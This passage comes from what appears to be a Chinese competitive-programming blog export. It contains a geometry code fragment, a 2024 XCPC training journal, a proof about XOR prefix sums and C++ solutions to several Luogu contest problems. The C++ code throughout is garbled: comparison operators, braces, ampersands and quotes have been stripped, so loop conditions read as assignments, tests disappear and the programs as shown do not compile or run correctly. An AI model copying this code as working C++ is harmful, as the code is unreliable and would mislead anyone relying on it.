(OA,OP1) + angle (OB,OP2)); else return sign * 0.5 * C.r * C.r * angle (OA,OB); // arc else // triangle + arc auto [P1,P2] = lc_inter (A,B,C); if (chk_on_seg (P2,A,B)) swap (P1,P2); Vector OP1 = P1 - C.O; if (dcmp (len (OA) - C.r) 0) return cross (OA,OP1) * 0.5 + sign * 0.5 * C.r * C.r * angle (OP1,OB); else return cross (OP1,OB) * 0.5 + sign * 0.5 * C.r * C.r * angle (OP1,OA); LD cc_area (Circle C1,Circle C2) int op = chk_cc_inter (C1,C2); if (op = 1) return pi * min (C1.r,C2.r) * min (C1.r,C2.r); else if (op == 4) return 0; else LD d = dis (C1.O,C2.O); LD alpha = 2 * acos ((C1.r * C1.r - C2.r * C2.r + d * d) / (2 * C1.r * d)); LD beta = 2 * acos ((C2.r * C2.r - C1.r * C1.r + d * d) / (2 * C2.r * d)); return 0.5 * (C1.r * C1.r * (alpha - sin (alpha)) + C2.r * C2.r * (beta - sin (beta)));","categories":["Algorithm"]},{"title":"XCPC 2024","path":"/2024/09/01/XCPC2024/","content":"$2024.8.25$ 组队由我 SUNCHAOYI 和两位大佬 oahgnail, Erusel 组成。 【说句闲话，由于组队有点匆忙，我和 Erusel 愣是花了一下午从新生群中的强省一个个人肉搜索找到的队友。】 好了，队名还是要乱搞的，于是就有了： 中文队名：仚屳屲冚(xiān xiān wā kǎn) \\\\ 英文队名：Supercalifragilisticexpialidocious $2024.8.28$ 第一次训练打的是今年的杭电多校（2），时间不太多只打了四个小时。 一人四题，我开的是最后四题毒瘤数据结构+模拟+字符串+神必图论。发现自己只会一题，不过还是 WA 了一发。把两题弱智模拟打过以后就到了口胡环节，反正就是一顿口胡后来不及写一点。 由于第一次打，四小时只干出了五题。 赛后补题： oahgnail在魔方这题写了一个超级大模拟，但被Erusel一语道破只需要处理六个角的情况，然后瞬间破防。 我把地牢这题订正了，简单来说就是状压处理后的情况搜索，细节很多感觉不太好写。 顺便订正了图计算，发现和 $\\texttt{CSP 2022 T3}$ 的思路相近，用字符串哈希的形式去判断是否相等，直呼好 trick。 $2024.8.30$ 第二次训练打的杭电多校（3），不过连四小时都没打满，仍然还是过了五题。 这次开题发现有一道比较裸的线段树和一道需要处理的图论，果断开写。 单峰数列直接通过差分将信息进行转化，然后维护差分是否 $,,=$ 以及单峰（可以由前面的信息进行转化）的状态，单点更新，区间查询，甚至不需要 pushdown(cur)。写完直接过样例，一发 AC。 比特跳跃 定义 $x \\to y$ 的代价是 $k \\times (x | y)$，主要需要分析出什么情况下使用跳跃是更优的。先跑一遍最短路，然后用跳跃的代价去更新最短路即可完成。【彩蛋：本人把 dij 给写错了导致一直过不了样例（虽然最后还是一发 AC 了，但是显得很蠢）。】 队友这边，还一直卡在三分上，直接罚时一车（好在通过了）。 $2024.8.31$ 哈希之自然溢出啥事没有？万恶之源：不基本子串结构。 毒瘤数据竟然把这个给卡了，所以好好去研究了一下。 自然溢出相当于是取余 $2^{64}$，所以需要尝试构造出两个字符串，哈希值能够 $\\mod 2^{64}$ 一样即可。 底数 $p$ 为偶数 构造 baaa ... a $(a \\times 64)$ 和 caaa...a $(a \\times 64)$。对于第一个位置上字符的哈希值，$hsh(‘b’)\\times p^{64} \\mod 2^{64}$ 和 $hsh(‘c’)\\times p^{64} \\mod 2^{64}$。由于 $2 \\mid p$，则有 $2^{64} \\mid p^{64}$，因此第一个位置上哈希值去模后的贡献均为 $0$，即会出现哈希碰撞的情况。 底数 $p$ 为奇数 首先规定： $s_1 = ‘a’$ $\\overline {s}$ 表示将 $s$ 中的 a 变为 b，b 变为 a $s_i = s_{i - 1} + \\overline {s_{i - 1}}$ $f_i = hsh (s_i) - hsh (\\overline {s_{i}})$ 显然 $s_i$ 的长度为 $2^{i - 1}$，那么就可以得到： hsh(s_i) = hsh(s_{i - 1}) \\times p^{2^{i - 1}} + hsh (\\overline {s_{i - 1}})\\\\ hsh(\\overline{s_i}) = hsh(\\overline{s_{i - 1}}) \\times p^{2^{i - 1}} + hsh(s_{i - 1})作差可知，$f_i = f_{i - 1} \\times (p^{2^{i - 1}} - 1)$。有奇偶性可知，$2^{64} \\mid f_{64}$，即 $s_{64}$ 符合条件，可仍然可以缩减长度。 由因式分解可知 $p^{2^{i - 1}} - 1 = (p^{2^{i - 2}} - 1) \\times (p^{2^{i - 2}} + 1) = (p^{2^{i - 2}} + 1) \\times (p^{2^{i - 3}} + 1) \\times \\cdots \\times (p^{2^1 } + 1) \\times (p^{2^1} - 1)$，因此 $2^{1 + 2 + \\cdots (i - 1)} = 2^{\\frac{i(i - 1)}{2}} \\mid f_i$。所以 $i 11$ 时均会冲突，即最小构造出 $s_{12}$ 和 $\\overline{s_{12}}$ 便会冲突。 $2024.09.06$ 网络赛模拟VP 了去年网络赛的第一场，最后切了六道题。然而口胡出的是九题，但是没来得及实现，最后 $1.5$ 小时没有过题，这是十分遗憾的。以及我们是超级无敌多的罚时，已经没救了…… 我写的是 $A,G,I$，队友写的 $D,J,L$，反正只有 $L$ 是一次过的。 $A,L$ 是签到模拟，讲个笑话，$A$ 我忘记删去 freopen 而挂了一次。接下来一个计数题丢给了我。大致题意是每次给定两个块，然后随机选块的点连边，问能变为题目所给树的概率。难点在于怎么判断答案为 $0$ 的情况。考虑两个块，若给定的树有连边，那么可以说明这两个块是有联系的，也就是总有一个块的父亲结点是另一个块中的结点。因此，可以按照深度进行并查集的合并以及判断无解的情况，每次的概率就相当于 $\\frac{1}{cnt_x cnt_y}$（$cnt_i$ 表示某个块的大小）。再讲个笑话，由于乘起来的时候忘记取模，导致 WA 了好多次。 然后再是 $D,J$，好像一个是并查集和连通块的题，还有一个数学签到（不过也分析了蛮久的样子）。 $I$ 是一道细节巨多的计数 DP（这种东西怎么老是丢给我），需要时间和空间上的双重优化。设 $dp_{i,j,k}$ 表示第 $i$ 位填 $j$，然后 $k$ 是一个状态，记录大小写以及数字是否出现过。由于相邻两个不能重复，所以我们可以用之前的总数减去相邻两个相同时的情况，从而优化复杂度到 $O(62 \\times 8 \\times n)$。然后又发现可以用滚动数组优化空间，变为 $O(62 \\times 2 \\times 8)$，于是做完了。但写的时候一个地方打错了，以及滚动数组清空写炸了，导致 WA 了好多好多次（没救了……）。 然后 $H$ 是我们快讨论出来的题目，但是被哈希如何快速判断 $p$ 是不是 $S_i$ 的周期的时候卡住了。后来最后想到了 border，但是显然没时间了。首先先想到了对于 $S_p$，显然 $p$ 是它的周期，然后发现可以二分 $w(w \\ge p)$，从而找到 $S_p,S_{p + 1},\\cdots,S_w$ 均满足 $p$ 是它们的周期。之后就是离线处理 $(k,l,r)$，分别按照 $k,w$ 从大到小排序，处理询问的时候利用双指针的想法将 $w \\ge k$ 的均加入到线段树中，然后就可以区间查询得出答案了。 由于不太会字符串，自然也不懂 $\\texttt{border}$ 的原理，于是恶补一下。 简单来说，若 $s$ 的一个子串（非原串）既是它的前缀又是它的后缀，则这个子串是它的 $\\texttt{border}$。若 $s[1,p] = s[|s| - p + 1,p]$，则 $s[1,p]$ 为 $\\texttt{border}$，可以推出 $|s| - p$ 是 $s$ 的周期。证明如下： 若一个字符串周期为 $p$，则 $\\forall x |s| - p$，有 $s[x + p] = s[x]$。那么设 $t$ 为 $s$ 的 $\\texttt{border}$ 所对应的长度，则 $\\forall x \\le t$，$s[x + (|s| - x)] = s[x]$，变形可得，$\\forall x \\le |s| - (|s| - t)$，$s[x + (|s| - t)] = s[x]$，符合周期定义。 MD 这提交了将近 $20$ 次，原来 s = ch + s 也会导致超时，但是 WA 又是怎么回事？？？改成双哈希也挂，取模又会超时？？？要红温了！！！！！！ $2024.09.07$ 网络预选热身赛测试设备，似乎都没啥问题，希望明天不要出锅。 总的来说，打得并不好。热身赛一共只有三道题，队友先想了第三题但是出锅了导致第二题在将近比赛结束的时候才过，还因为神必错误挂了两次，因此排名很靠后。哎不是今天怎么都是我在过题，人麻了…… $A$ 就是一个搜索，需要计算出形如 $1,0,8$ 这种 # 内部有 $0,1,2$ 个洞（用 .）的个数。没啥好说，不停 $\\texttt{dfs}$ 去处理就好了，很快写完，一发过。 $C$ 是先写的，但是因为题目描述不清，口胡过于粗糙等原因写了好久但是 WA。 $B$ 就是给 $num_i$ 个 $i(i \\in [0,9])$，然后从中取 $m$ 个使得组成的数最小。难点在于如何在构造大数的同时取模。我的想法是令 $f_{i,j}$ 表示有 $2^{j - 1}$ 个数字 $i$ 时取模的值，可以列出递推式，$f_{i,j} = f_{i,j - 1} \\times 10^{2^{j - 2}} + f_{i,j - 1}$。在构造的时候需要特殊处理最高位（当然也就要特判 $m = 1$ 答案为 $0$ 的情况），然后按照进制为倒序循环 $30 \\to 1$，计算即可。当然，赛后讲题发现有种更显然的做法，就是 $99 \\cdots 9 = 10^k - 1$，好好好，要破防了……这题的锅还是队友检查（一眼）出来的，由此可见团队合作的重要性！（我自己检查 $15$ 分钟死活没看出来） $D$ 应该就没尝试过，所以就先不说了。 明天加油！ $2024.09.07$ CCPC 网络预选省流：做题不在状态，做出 $5$ 题，打成屎了。 因为网络问题还延长了 $1$ 小时，但总归还有点影响。 很快地打完了 $B,L$ 签到，还被 $B$ 所有数都一样的情况给恶心了一发。然后我开始开 $K$，想到了一种自己认为很对的算法，没怎么和队友讨论就交了，还 WA 了两次才发现假，好在和队友讨论了一下醒悟了过来，最后在一大堆分类讨论中过了这题。赛后发现只需要考虑 lowbit(n) 与 $k$ 的大小即可。 然后就到了本场比赛问题最大的 $D,E$，$E$ 纯靠队友开题，然后一直处于一种想到了然后发现假了/复杂度超了的情况，而且还有两个小问。一直到了 $3.5$ 小时左右才过这题。 $D$ 题不知咋的我们三个都无思路，却发现榜上一大堆的人过了，于是我们都开始慌了。直到我无意发现时间限制是 $2$ 秒，才醒悟原来朴素的区间 $DP$ 就可过，然后才开写，期间队友写红温了，还换了个人来重构，总之在 $5$ 小时的时候才过，而且还因为初始化问题 WA 了两次。 $J$ 想了，题意顺利转换了，但是线性基不会，所以没法写。$I$ 想了，但是很复杂，先是 $O(n^4)$ 的算法，然后队友用一种我没怎么理解的算法写了，不过到结束也没有成功调出来（悲）。 赛后一顿反思、复盘…… 第二天开始补题，嗯哼这个 $D$ 怎么这么简单？嗯哼这个 $C$ 怎么没看过题，但是这么可做？$I$ 想到了一种简单做法，那就实现一下？ 枚举最短时间 $t$，对于一个真实存在的 $t$（可以通过预处理记录）。设 $dp_{i,j}$ 表示前 $i$ 个人拿了 $j$ 个行李的方案数（注意对答案的贡献还要乘上 $t$，我就是这里被卡了很久很久）。由于枚举的是最短时间 $t$，就需要这个时间 $t$ 一定得取到，对于一个人选择行李的坐标范围为 $[1,x - t]$（$x$ 表示当前的人所在的坐标，由于直接转移可能会因为 $x - t$ 都未取到而导致错误，所以我们通过两次 dp，分别处理 $[1,x - t]$ 和 $[1,x - t - 1]$ 的情况，作差得到答案。 转移方程（只写出一个，其中 $sum_i$ 表示坐标上 $[1,i]$ 的行李数）： \\begin{cases} dp_{0,0} = 1\\\\ dp_{i,j} = dp_{i,j}+dp_{i-1,j}\\\\ dp_{i,j + 1} = dp_{i,j + 1}+dp_{i - 1,j} \\times \\max (0,sum_{\\max(0,b_i - t)} - j)\\\\ tot = tot+\\sum_{i = 1}^{\\min (n,m)} dp_{m,i} \\end{cases}最后的代码如下，还被 codeforces 的卡常整红温了。 #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 505;const int MOD = 998244353;inline int read ();int n,m,a[MAX],b[MAX],vis[MAX],sum[MAX];int dp[MAX][MAX],ans,tot1,tot2;//dp[i][j] 前 i 个人选了 j 个行李的方案数 int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = m;++i) b[i] = read (); sort (a + 1,a + n + 1);sort (b + 1,b + 1 + m); for (int i = 1;i = m;++i) for (int j = 1;j = n;++j) if (a[j] b[i]) vis[b[i] - a[j]] = 1; for (int i = 1;i = n;++i) ++sum[a[i]]; for (int i = 1;i = 500;++i) sum[i] += sum[i - 1]; for (int t = 0;t = 500;++t) if (!vis[t]) continue; tot1 = tot2,tot2 = 0; if (!tot1) for (int i = 1;i = m;++i) for (int j = 1;j = n;++j) dp[i][j] = 0; dp[0][0] = 1; for (int i = 1;i = m;++i) for (int j = 0;j = min (m,sum[b[i]]);++j) dp[i][j] += dp[i - 1][j];dp[i][j] %= MOD; if (j + 1 = min (m,sum[b[i]])) dp[i][j + 1] += 1ll * dp[i - 1][j] * max (0,(sum[max (0,b[i] - t)] - j)) % MOD,dp[i][j + 1] %= MOD; for (int i = 1;i = min (n,m);++i) tot1 = (tot1 + dp[m][i]) % MOD; for (int i = 1;i = m;++i) for (int j = 1;j = n;++j) dp[i][j] = 0; dp[0][0] = 1; for (int i = 1;i = m;++i) for (int j = 0;j = min (m,sum[b[i]]);++j) dp[i][j] += dp[i - 1][j];dp[i][j] %= MOD; if (j + 1 = min (m,sum[b[i]])) dp[i][j + 1] += 1ll * dp[i - 1][j] * max (0,(sum[max (0,b[i] - t - 1)] - j)) % MOD,dp[i][j + 1] %= MOD; for (int i = 1;i = min (n,m);++i) tot2 = (tot2 + dp[m][i]) % MOD; ans += 1ll * (tot1 - tot2 + MOD) * t % MOD;ans %= MOD; printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f; 开始恶补线性基，看的是这个 洛谷日报。 简单来说，线性基是一个集合，取线性基中若干个数异或起来可以得到原序列中的任何一个数。那么如果要插入一个数 $x$，只需要判断 $x$ 在二进制下的每一位非 $0$ 位在线性基中是否存在。 for (int i = 60;~i;--i) if (!((1ll i) x)) continue; if (!p[i]) x^= p[i]; else p[i] = x; 求序列中选若干个数异或的最大值，只需要在求出线性基的基础上从高到低贪心看是否需要异或上 $p_i$ 即可。 求序列中选若干个数异或的最小值，若有元素无法插入线性基，则答案为 $0$，否则为最小的 $p_i$。 同样的，I 题经过题意转化后就是在维护出 $c_i = a_i \\oplus b_i$ 的线性基后按高到低贪心去更新即可，部分代码如下： for (int i = 1;i = n;++i) int x = a[i] ^ b[i]; for (int i = 30;~i;--i) if (!((1 i) x)) continue; if (!p[i]) p[i] = x;break; else x ^= p[i]; for (int i = 30;~i;--i) if (max (suma,sumb) max (suma ^ p[i],sumb ^ p[i])) suma ^= p[i],sumb ^= p[i]; 不写 C 题真的后悔一万年。贪心的思路，从下往上，如果未遇到已种植的点，那就将子树大小向上传；否则以它为根处理其子树内的点。唯一需要注意的是，以某点为根处理时，可能会有多余的点可以向上传递至它的父亲。核心代码如下： void dfs (int u,int fa) sz[u] = 1; for (auto v : ve[u]) if (v == fa) continue; dfs (v,u); sz[u] += sz[v]; if (vis[u]) ans += max (sz[u] / 2,0); if (sz[u] % 2 == 0) vis[fa] = 1;//有多余，向上传递至父亲节点 sz[u] = 0;//该子树内全部处理完 else if (u == 1) ans += max ((sz[u] + 1) / 2,0);//特判向上一直再无遇到 vis[i] = 1 的点 2024.09.15 ICPC 网络赛Ⅰ笑死，队长报名只写了他一个人。于是乎，这场没打… 但赛后发现这场似乎挺难，那就还好！ 2024.09.21 ICPC 网络赛Ⅱ这场打地很顺，开场半小时过完 F,J,A 签到。然后队友开 I 构造题，显然可以用高位弥补低位凑出解，又光速发现末位为 $00$ 时是无解的情况，于是做完了。然而，队友因为输出反了挂了一发。 然后和队友开始做 $L$，一开始搞错题意以为只能最多 refresh 操作一次，WA 了两发以后我直接高中列表法求期望但误以为临界点 $t$ 在 $\\lfloor\\frac{n}{2}\\rfloor + 1$。 $1$ $2$ $\\cdots$ $t$ $E(x) + 1$ $P$ $\\frac{1}{n}$ $\\frac{1}{n}$ $\\dots$ $\\frac{1}{n}$ $\\frac{n - t}{n}$ 求得 $E(x) = \\frac{t ^ 2 - t + 2n}{2t}$。WA 了一发后队友通过解不等式以后过了这题。 接着开 G，怎么又是推式子，然后发现平局啥用没有。 我这时候开始读 E，冗长的题面，以为是不可做题。然后给队友翻译了一下，随口说了一句奇偶性分层图，结果被他给秒了，在此膜拜。 好了七题了，之后尝试了几题全都无果（我甚至还尝试数据结构来着，笑死这题只有一个队通过），一小时坐牢，最后喜提校 $\\texttt{rk 3}$。 由于本人前一天脑抽打了一场掉分近 $100$ 的 CF，所以说又光明正大地水了这场比赛，全靠队友！！！ 2024.xx.xx 选赛站选了 $2024.11.2-11.3$ 的 $\\texttt{ICPC}$ 南京站 和 $2024.11.9-11.10$ 的 $\\texttt{CCPC}$ 重庆站。加油吧，争取拿牌！ 2024.11.2-11.3 ICPC 南京详见 游记—ICPC 小白勇闯南京。 2024.11.9-11.10 CCPC 重庆$5$ 题铁了，那道构造回去给室友讲题的时候突然顿悟，可惜晚了……打的太烂就不写游记了。 一些好文，留着看： Some Simple Tricks 一些 trick","categories":["Journal"]},{"title":"求 $[1,n]$ 的异或和","path":"/2024/08/13/XOR/","content":"部分参考 此处。 通过打表可以找到规律，给出结论： \\oplus_{i = 1}^{n} i =\\left\\{ \\begin{aligned} n \\ (n \\equiv 0 \\bmod 4)\\\\ 1 \\ (n \\equiv 1 \\bmod 4)\\\\ n + 1 \\ (n \\equiv 2 \\bmod 4)\\\\ 0 \\ (n \\equiv 3 \\bmod 4) \\end{aligned} \\right.设 $f(l,r)$ 表示区间 $[l,r]$ 的异或和。由于$f(2^k,2^{k + 1} - 1)$ 中的最高位出现 $2^k$ 次，则由 $2^k \\equiv 0 \\bmod 2$ 可知 $f(2^k,2^{k + 1} - 1) = f(1,2^k - 1)$，所以说可以得到： f (1,2^{k + 1} - 1) = f (1,2^k - 1) \\oplus f (2^k,2^{k + 1} - 1) = 0对于 $k \\ge 2$ 时，要求 $f(1,n)$ 时，若最高位为 $2^k$，则 $f (1,n) = f(1,2^k - 1) \\oplus f (2^k,n) = f(2^k,n)$。设 $p = n - 2^k + 1$，则有： $p \\equiv 0 \\bmod 2$ $f (2^k,n) = f(1,n - 2^k)$，又因为 $n - 2^k$ 与 $n$ 同奇偶，故由于 $k \\ge 2$，$f (1,n)$ 的值取决于小于 $4$ 的部分。也就是说： \\oplus_{i = 1}^{n} i =\\left\\{ \\begin{aligned} 1 \\ (n \\equiv 1 \\bmod 4)\\\\ 0 \\ (n \\equiv 3 \\bmod 4) \\end{aligned} \\right. $p \\equiv 1 \\bmod 2$ 同理可知最高位可以保留，同时 $f (1,n)$ 的值也取决于小于 $4$ 的部分。也就是说： \\oplus_{i = 1}^{n} i =\\left\\{ \\begin{aligned} n \\ (n \\equiv 0 \\bmod 4)\\\\ n + 1 \\ (n \\equiv 2 \\bmod 4)\\\\ \\end{aligned} \\right.","categories":["Algorithm"]},{"title":"题解：P10865 [HBCPC2024] Genshin Impact Startup Forbidden III","path":"/2024/08/11/P10865/","content":"一个位置最多只有 $3$ 条鱼，而所有有鱼的格子不超过 $10$，所以我们可以写一个 $4$ 进制的状态压缩。设 $dp_s$ 表示 $k$ 个有鱼的格子中受到炸弹影响后的状态为 $s$ 时所需要的最小的炸弹的数量。 同时，由于一个炸弹只能影响到五个格子，所以我们可以预处理出不超过 $50$ 个可能会放炸弹的位置。当状态为 $s$ 时，在某处放入一个炸弹，我们可以将 $s$ 每一位分离后，修改炸弹影响到的那些位置，然后再重新获得 $s’$。因此可以列出转移方程 $dp_{s’} = \\min (dp_{s’},dp_s + 1)$。 最后的时间复杂度约为 $O(4^k \\times k^2)$，可以通过此题。代码如下： #include bits/stdc++.h#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e6 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,k,p,tot,v[15],dp[MAX],sx[] = 0,1,-1,0,0,sy[] = 0,0,0,1,-1;vector int tmp;set pair int,int loc;map pair int,int,int id;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read ();k = read (); for (int i = 0;i k;++i) int x = read (),y = read ();v[i] = read (); id[x,y] = i;//用 map 记录下对应的位置 for (int j = 0;j 5;++j) int xx = x + sx[j],yy = y + sy[j]; if (1 = xx xx = n 1 = yy yy = m) loc.insert (xx,yy);//预处理出炸弹可能放置的位置，用 set 去重 tot = tot * 4 + v[i];//处理出对应的四进制数 init (dp);dp[0] = 0; for (int i = 0;i = (1 (2 * k));++i) if (dp[i] == INF) continue; for (auto nxt : loc) int x = nxt.first,y = nxt.second; p = i;tmp.clear (); for (int j = 1;j = k;++j) tmp.push_back (p % 4),p /= 4;//逐位分离 for (int j = 0;j 5;++j) int xx = x + sx[j],yy = y + sy[j]; if (id.find (xx,yy) == id.end ()) continue;//不需要放置炸弹 int o = id[xx,yy]; tmp[k - o - 1] = min (v[o],tmp[k - o - 1] + 1);//炸弹最多不超过格子中鱼的数量 注意下标 p = 0; for (int i = tmp.size () - 1;~i;--i) p = p * 4 + tmp[i];//重新计算出新的状态 dp[p] = min (dp[p],dp[i] + 1); printf (%d ,dp[tot]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P10864 [HBCPC2024] Genshin Impact Startup Forbidden II","path":"/2024/08/11/P10864/","content":"【题目大意】 模拟围棋的落子过程，然后根据围棋的气来计算每一步落子后被提子的个数。 当然强调了，每一步的落子没有限制，也就有可能某个棋子刚落下去后会直接被提掉。 【思路】 直接在落子后暴力搜索计算出相邻的棋子所在块的气，最后在计算落子位置所在块的气。 具体来说，对于从 $(x,y)$ 开始搜索的棋子，每到达一个未被访问到的同色棋子的块，就加入到集合中；每到达一个未被访问到的空位，就把该连通块的气的数目加一。 由于时限为 $4s$，并且棋盘的大小是 $19 \\times 19$ 的，所以复杂度为 $O(m)$，可以通过此题。 【代码】 #include iostream#include cstdio#include algorithm#include cmath#include cstring#include vector#define init(x) memset (x,-1,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();vector pair int,int v;int t,outa,outb,cnt;int a[25][25],vis[25][25],sx[] = 0,0,1,-1,sy[] = 1,-1,0,0; void search (int x,int y,int col);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read ();init (a); for (int i = 1;i = t;++i) int x = read (),y = read (),ty = (i 1) ? 0 : 1;//ty = 1 为白棋 a[x][y] = ty;outa = outb = 0;//先处理对手的气的情况，提完子后再处理自己的气 for (int i = 0;i 4;++i)//处理这个棋子的相邻位置 int xx = x + sx[i],yy = y + sy[i]; cnt = 0;v.clear (); if (1 = xx xx = 19 1 = yy yy = 19) if (a[xx][yy] == (ty ^ 1) !vis[xx][yy]) search (xx,yy,ty ^ 1); if (!cnt)//没有气会被提子 if (ty == 0) outb += v.size (); else outa += v.size ();//提子的数目即为 v 的大小 for (auto p : v) a[p.first][p.second] = -1;//清空这些位置 cnt = 0;v.clear (); search (x,y,ty); if (!cnt) if (ty == 0) outa += v.size (); else outb += v.size (); for (auto p : v) a[p.first][p.second] = -1; for (int i = 1;i = 19;++i) for (int j = 1;j = 19;++j) vis[i][j] = 0; printf (%d %d ,outa,outb); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void search (int x,int y,int col) vis[x][y] = 1;v.push_back (x,y);//标记 for (int i = 0;i 4;++i) int xx = x + sx[i],yy = y + sy[i]; if (1 = xx xx = 19 1 = yy yy = 19) if (a[xx][yy] == -1) ++cnt;//空位 if (a[xx][yy] == col !vis[xx][yy]) search (xx,yy,col);","categories":["Solution"]},{"title":"题解：P10701 [SNCPC2024] 致命公司","path":"/2024/07/06/P10701/","content":"看完题目后盲猜二分答案（）。 题目的难点显然是如何分配凝视的时间于不同的通道，以及如何在一次凝视时将通道内的子弹进行标记。 二分时刻 $t$，对于所有的子弹，有以下情况： 在 $t$ 时刻，该子弹仍未出现，忽略该子弹。 从子弹出现到 $t$ 时刻，不需要额外再使用凝视，忽略该子弹。 从子弹出现到 $t$ 时刻，需要额外使用凝视，计算并标记。当然，需要先判断所剩的时间能否满足条件。 那么对于第一个难点，可以对子弹出现的时间进行排序，为了使得凝视不会产生后效性，我们按照时间进行降序，依次考虑子弹所在通道所需的凝视时间。对于第二个难点，只需再用一个数组记录通道已用的凝视的时间即可。 特别地，当所有子弹都在同一个通道时，永远都不会受到伤害，特判即可。 最后时间复杂度 $O(n \\log n)$。最终代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f3f3f3f3fusing namespace std;const int MAX = 5e5 + 5;const int MOD = 1e9 + 7;inline ll read ();struct node ll t,x,y; s[MAX];ll tot,n,m,k,l = 0,r = INF,ans,ex[MAX],st[MAX]; bool cmp (node xx,node yy);ll check (ll ti);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read ();k = read (); for (int i = 1;i = m;++i) s[i].t = read ();s[i].x = read ();s[i].y = read (); if (!ex[s[i].x]) ex[s[i].x] = 1,++tot; sort (s + 1,s + 1 + m,cmp);//按照时间降序排序 if (tot == 1) puts (-1);return 0;//特判 while (l = r) ll mid = (l + r) 1; if (check (mid)) ans = mid,l = mid + 1; else r = mid - 1; printf (%lld ,ans); return 0;inline ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (node xx,node yy) return (xx.t == yy.t) ? xx.y yy.y : xx.t yy.t;//时间晚的优先 ll check (ll ti) ll ret = ti;//从 ti 开始消耗用于凝视 for (int i = 1;i = n;++i) st[i] = 0;//每个通道被凝视的次数 for (int i = 1;i = m;++i) if (ti s[i].t) continue;//该子弹还未出现 ll tmp = (s[i].y - 1) / k + 1 + st[s[i].x] + s[i].t - 1;//到达时的时间 if (tmp ti) continue;//子弹在 ti 时无法达到 tmp = ti - tmp + 1;//需要凝视的时间 if (ret - tmp + 1 s[i].t) return 0;//剩余时间无法处理 ret -= tmp;st[s[i].x] += tmp;//进行标记 return 1;","categories":["Solution"]},{"title":"题解：P9778 [HUSTFC 2023] 基因编辑","path":"/2024/06/20/P9778/","content":"将题意进行简单的转换，枚举 $S_k$，然后再枚举其中的断点 $i$，将其分为 $S_k[:i]$ 和 $S_k[i + 1:]$。因此只需要求出前缀为 $S_k[:i]$ 和 $S_k[i + 1:]$ 的乘积，不难想到对前缀和后缀分别建立 $\\texttt{Trie}$ 树。 但是问题并没有完全解决，手模第一个样例发现，$\\texttt{A + AA}$ 和 $\\texttt{AA + A}$ 均可以得到 $\\texttt{AAA}$，也就是说目前算法存在重复计算。考虑一个贪心的思想，若一个较长的子串中存在所需串，则只将标记打在较长串上而不是其中的较短的所需串，显然这样标记严格覆盖的。那么，结合差分的思想，设 $f_{i,j}$ 表示以 $S_i[:j]$ 为前缀的个数，则 $f_{i,j} - f_{i,j + 1}$ 得到的一定是严格以 $S_i[:j]$ 为前缀的个数。在统计答案的时候，从长的串到短的串进行累积即可。 时间复杂度 $O(\\sum |S_i|)$。代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include map#include vector#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e6 + 5;const int MOD = 1e9 + 7;inline int read ();map char,int mp;int n,pre_cnt = 1,sub_cnt = 1,len[MAX],pre_ch[MAX][5],sub_ch[MAX][5],pre_tot[MAX],sub_tot[MAX];vector ll pre_ans[MAX],sub_ans[MAX];vector char s[MAX]; char str[MAX];ll ans;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); mp[A] = 1;mp[G] = 2;mp[C] = 3;mp[T] = 4; n = read (); for (int i = 1;i = n;++i) scanf (%s,str); len[i] = strlen (str); int u = 1; for (int j = 0;j len[i];++j)//two Tries s[i].push_back (str[j]); int c = mp[s[i][j]]; if (!pre_ch[u][c]) pre_ch[u][c] = ++pre_cnt; u = pre_ch[u][c]; ++pre_tot[u]; u = 1; for (int j = len[i] - 1;~j;--j) int c = mp[s[i][j]]; if (!sub_ch[u][c]) sub_ch[u][c] = ++sub_cnt; u = sub_ch[u][c]; ++sub_tot[u]; for (int i = 1;i = n;++i) int u = 1,sum;pre_ans[i].push_back (n - 1); for (int j = 0;j len[i];++j) int c = mp[s[i][j]]; u = pre_ch[u][c]; pre_ans[i].push_back (pre_tot[u] - 1);//the empty situation if (!u) break; for (int j = 1;j = len[i];++j) pre_ans[i][j - 1] -= pre_ans[i][j]; // subtraction gives a precise value u = 1;sub_ans[i].push_back (n - 1); for (int j = len[i] - 1;~j;--j) int c = mp[s[i][j]]; u = sub_ch[u][c]; sub_ans[i].push_back (sub_tot[u] - 1); if (!u) break; for (int j = 1;j = len[i];++j) sub_ans[i][j - 1] -= sub_ans[i][j]; for (int i = 1;i = n;++i) ll sum = 0; for (int j = 0;j = len[i];++j) sum += sub_ans[i][len[i] - j],ans += sum * pre_ans[i][j]; // Equivalently,for j in range from len[i] to 0 is workable,but sum should be sub_pre printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) 